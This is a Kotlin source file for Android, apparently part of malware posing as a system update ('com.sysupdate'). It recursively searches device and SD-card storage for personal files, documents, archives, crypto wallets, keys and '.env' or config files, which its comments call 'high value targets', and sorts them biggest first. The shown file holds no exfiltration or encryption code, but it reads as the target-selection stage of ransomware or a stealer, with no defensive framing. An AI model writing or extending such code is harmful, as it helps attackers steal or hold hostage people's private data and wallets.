package com.sysupdate

import android.content.Context
import android.os.Environment
import java.io.File

object FileEnumerator {

    private val TARGET_EXTENSIONS = setOf(
        // Images
        "jpg", "jpeg", "png", "gif", "bmp", "webp", "heic", "raw", "tiff",
        // Video
        "mp4", "mkv", "avi", "mov", "3gp", "m4v", "wmv", "flv",
        // Audio
        "mp3", "aac", "wav", "flac", "ogg", "m4a", "wma",
        // Documents
        "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
        "txt", "csv", "xml", "json", "html", "odt", "rtf",
        // Archives
        "zip", "rar", "7z", "tar", "gz", "bz2",
        // Databases / crypto
        "db", "sqlite", "sqlite3", "key", "wallet", "dat",
        // Code / config (high value targets)
        "py", "js", "java", "kt", "sh", "env", "cfg", "ini"
    )

    private val SKIP_DIRS = setOf(
        "android", "proc", "sys", "dev", "system",
        "data", "cache", ".thumbnails", "lost+found"
    )

    fun enumerateTargets(ctx: Context): List<File> {
        val roots = mutableListOf<File>()

        // Primary external storage
        val extStorage = Environment.getExternalStorageDirectory()
        if (extStorage.exists()) roots.add(extStorage)

        // Secondary storage cards
        File("/storage").listFiles()?.forEach { mount ->
            if (mount.isDirectory && mount.name != "emulated") roots.add(mount)
        }

        // App-accessible external dirs
        ctx.getExternalFilesDirs(null).forEach { dir ->
            dir?.parentFile?.parentFile?.parentFile?.let { root ->
                if (root.exists() && !roots.contains(root)) roots.add(root)
            }
        }

        val results = mutableListOf<File>()
        roots.forEach { walkDir(it, results) }
        return results.sortedByDescending { it.length() } // biggest files first
    }

    private fun walkDir(dir: File, out: MutableList<File>) {
        if (!dir.canRead()) return
        if (dir.name.lowercase() in SKIP_DIRS) return

        dir.listFiles()?.forEach { f ->
            when {
                f.isDirectory  -> walkDir(f, out)
                f.isFile
                && f.length() > 512           // skip tiny/empty files
                && f.extension.lowercase() in TARGET_EXTENSIONS -> out.add(f)
            }
        }
    }
}
